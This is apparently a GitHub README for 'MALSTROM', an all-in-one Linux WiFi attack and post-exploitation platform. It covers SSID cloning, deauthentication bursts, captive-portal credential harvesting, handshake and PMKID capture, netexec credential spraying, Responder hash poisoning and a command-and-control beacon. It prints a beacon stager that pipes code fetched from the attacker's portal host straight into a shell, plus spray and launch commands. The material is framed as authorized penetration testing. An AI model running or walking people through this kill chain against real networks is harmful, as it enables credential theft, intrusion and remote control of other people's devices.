<div align="center">

# MALSTROM

**Monolithic WiFi Attack & Post-Exploitation Platform for Linux**

![Version](https://img.shields.io/badge/version-2.4-blue.svg?style=for-the-badge&logo=linux)
![Python](https://img.shields.io/badge/python-3.9%2B-3776AB.svg?style=for-the-badge&logo=python&logoColor=white)
![License](https://img.shields.io/badge/license-Authorized--Use--Only-red.svg?style=for-the-badge)
![Platform](https://img.shields.io/badge/platform-Linux-FCC624.svg?style=for-the-badge&logo=linux&logoColor=black)
![Status](https://img.shields.io/badge/build-passing-brightgreen.svg?style=for-the-badge)
<img width="1376" height="768" alt="image" src="https://github.com/user-attachments/assets/9ef73d1d-7581-480d-8239-91e1f0cb61fd" />

<br />

```text
    __  ______   __   ____________  ____  __  ___
  /  |/  / _ | / /  / __/_  __/ _ \/ __ \/  |/  /
 / /|_/ / __ |/ /___\ \  / / / , _/ /_/ / /|_/ /
/_/  /_/_/ |_/____/___/ /_/ /_/|_|\____/_/  /_/

                   DarkSec MALSTROM

An all-in-one suite designed for wireless auditing, rogue access point deployment, credential harvesting, and integrated post-exploitation—managed from an interactive, real-time web dashboard.
Overview •
Quick Start •
Dashboard Workspaces •
Modules •
Specifications •
Structure
<br />
<img width="1376" alt="DarkSec Malstrom Operator Dashboard" src="https://github.com/user-attachments/assets/0a888476-03df-4973-9b29-517139c3ba60" />
</div>
⚡ Overview
DarkSec MALSTROM automates the end-to-end WiFi attack vector from a single process. It handles target SSID cloning, deauthentication bursts, and OS-adaptive captive portal deployment while driving an interactive web dashboard bound to http://127.0.0.1:8888 via a live SSE event stream.
The rogue AP runs on a virtual interface (ap0) carved from a spare radio to preserve active internet uplinks.
┌─────────────────────────────────────────────────────────────────────────┐
│ DARKSEC MALSTROM v2.4                                                   │
│ [[http://127.0.0.1:8888](http://127.0.0.1:8888)]                                                 │
├─────────────────────────────────────────────────────────────────────────┤
│ INTERFACE  │ wlan1mon (Radio 1) | AP IFACE │ ap0 (Radio 2)              │
│ TARGET     │ 00:11:22:33:44:55 (Target_SSID) | CH 6                     │
├─────────────────────────────────────────────────────────────────────────┤
│ AUDITING & ATTACK MODULES                                               │
│ [x] Deauth (Aireplay/Raw)   [x] Captive Portal         [ ] Karma Listen │
│ [x] EAPOL/PMKID Sniffer     [ ] NetExec Spray          [ ] Responder    │
├─────────────────────────────────────────────────────────────────────────┤
│ [ LAUNCH ATTACK CHAIN ]                                [ DISARM / STOP ]│
└─────────────────────────────────────────────────────────────────────────┘

🎯 The Kill Chain
 * RECON — iw scan ➔ Select target via Operator Dashboard
 * SKOLL — hostapd ➔ Clone target SSID (Open / Evil-WPA)
 * FENRIS — aireplay-ng / raw 802.11 ➔ Broadcast, targeted, or adaptive deauth
 * LOKI — Python :80 ➔ OS-adaptive captive portal deployment
 * PAYLOAD — tcpdump / internal ➔ Passive EAPOL handshake & PMKID capture
 * HARVEST — ~/loot/malstrom/ ➔ Stream credentials to dashboard
 * MONITOR — Live tables ➔ Client tracking, ARP alerts, Karma probes
 * POST-EX — Lateral / MITM ➔ Credential spray, Responder, beacon sessions
🚀 Quick Start
Prerequisites & Dependencies
MALSTROM requires Python 3.9+ and standard Linux networking utilities:
 * Required System Binaries: hostapd, dnsmasq, iptables, iw, aireplay-ng, tcpdump
 * Post-Exploitation Binaries: nmap, netexec, responder
Execution
Root privileges are required for direct radio management and firewall manipulation:
# Full stack execution (engine + portal + dashboard)
sudo ./bin/malstrom

# Launch and automatically open the operator dashboard in default browser
sudo ./bin/malstrom --open

# Environment readiness check (read-only audit of binaries & interfaces)
sudo ./bin/malstrom --check

# Launch without token gate enforcement on localhost
sudo ./bin/malstrom --no-auth

Dashboard CLI Commands
sudo malstrom start       # Start background daemon & display access details
sudo malstrom launch      # Start daemon if needed and launch signed-in UI
malstrom open             # Open dashboard with auto-filled access token
malstrom token            # Print current operator access token

🖥️ Dashboard Workspaces
| Workspace Tab | Core Functionality |
|---|---|
| Attack | Configure BSSID/SSID/Channel targets, portal modes, and deauth burst rates. |
| Payload | Manage WPA handshake/PMKID capture parameters and upload custom HTML portal templates. |
| Monitor | Track connected rogue-subnet clients, view probe requests, and adopt target SSIDs. |
| Loot | Multi-tab vault for credentials, device fingerprints, handshakes, probes, and PCAPs. |
| Recon | Host discovery and TCP port scanning (Nmap wrapper) with direct feed to Lateral modules. |
| Lateral | Automated credential spraying (netexec) testing portal creds against SMB/SSH/RDP/WinRM. |
| MITM | Responder integration for LLMNR/mDNS/NBT-NS poisoning and NetNTLMv2 hash harvesting. |
| Sessions | Command-and-control tasking interface for POSIX sh and PowerShell /beacon agents. |
| Settings | Manage LAN binding, access tokens, beacon key rotation, and factory resets. |
⚙️ Post-Exploitation Modules
1. Recon & Mapping
Executes network sweeps across target subnets (including rogue 172.16.52.0/24 or accessible LAN CIDRs). Results feed directly into the credential spray engine.
2. Lateral Movement (Credential Spray)
Runs netexec against target hosts using harvested credentials across supported protocols:
netexec <protocol> <target_cidr> -u <user> -p <pass>

Successful authentication vectors are flagged with [+] OWNED alerts and committed to owned.json.
3. MITM & Poisoning
Spawns Responder on the rogue AP interface to intercept broadcast name resolution requests (LLMNR/mDNS/NBT-NS). Captured NetNTLMv2 hashes are formatted for hashcat and indexed directly into the Loot vault.
4. Beacon Sessions
Generates light footprint agent scripts for target command execution:
 * POSIX: curl -s http://<portal-ip>/beacon | sh
 * PowerShell: http://<portal-ip>/beacon.ps1
> Note: Beacons enforce target validation, requiring explicit arming, encrypted payload tokens, and rogue-subnet source IPs. Disarming instantly stops task execution.
> 
📊 Capture & Deauth Specifications
WPA Capture Vectors
| Capture Mode | Target Frame Types | Harvest Output |
|---|---|---|
| handshake | EAPOL 4-Way Handshake (Msg1 + Msg2) | Captured .pcap & handshakes.json |
| pmkid | RSN PMKID Elements (00 0f ac 04) | Extracted PMKID hashes |
| both | EAPOL Msg1/Msg2 + RSN Elements | Full PCAPs + Hashcat-ready dumps |
Note: Traffic generated by MALSTROM's internal rogue AP is automatically filtered out during sniffer execution.
Deauth Operating Modes
| Mode | Operation Mechanics |
|---|---|
| broadcast | Sends FF:FF:FF:FF:FF:FF deauthentication frames to the entire target channel. |
| targeted | Limits deauth frames exclusively to discovered client MACs on the target AP. |
| adaptive | Operates silently, triggering targeted deauth bursts only when client traffic is observed. |
| off | Disables frame injection; keeps passive capture and evil-twin portals active. |
📁 Loot Storage & Maintenance
Harvested data is stored locally in ~/loot/malstrom/ (or /var/lib/malstrom when executed as a system service):
~/loot/malstrom/
├── creds.json          # Harvested portal credentials
├── devices.json        # Client fingerprints (MAC, Hostname, OS, User-Agent)
├── handshakes.json     # Indexed EAPOL and PMKID captures
├── hashes.json         # Intercepted NetNTLMv2 hashes (Hashcat format)
├── owned.json          # Validated lateral movement target pairs
├── probes.json         # Logged Karma probe requests
├── pcaps/              # Raw 802.1X frame captures (.pcap)
└── scans.json          # Network recon cache

Maintenance Commands
 * Wipe Loot (CLI): sudo malstrom wipe-loot — Clears captured loot while preserving system configuration.
 * Factory Reset (CLI): sudo malstrom reset — Halts running daemons, deletes all loot, resets state, and clears access tokens.
📂 Repository Structure
MALSTROM/
├── bin/
│   └── malstrom        # CLI management binary
├── malstrom/
│   ├── app.py          # Central orchestrator & CLI execution loop
│   ├── web.py          # Dashboard HTTP server & SSE stream handler
│   ├── portal.py       # Python-native captive portal engine
│   ├── services.py     # hostapd, dnsmasq, and iptables lifecycle handlers
│   ├── deauth.py       # Frame injection & raw socket engine
│   ├── capture.py      # EAPOL / PMKID sniffer module
│   ├── lateral.py      # Netexec credential spray wrapper
│   ├── mitm.py         # Responder integration module
│   └── beacon.py       # Agent payload server & session manager
├── www/                # Web dashboard assets (JS/CSS)
└── portal/
    └── templates/      # OS-adaptive captive portal templates

⚖️ Legal Disclaimer
> FOR AUTHORIZED PENETRATION TESTING ONLY
> DarkSec MALSTROM is designed exclusively for authorized wireless security auditing and research. Unlawful frame injection, deauthentication, or credential harvesting on networks without prior explicit written permission from the owner is illegal. The author assumes no liability for misuse or damage.
> 
<br />
<div align="center">
Developed by wickednull
DarkSec
</div>

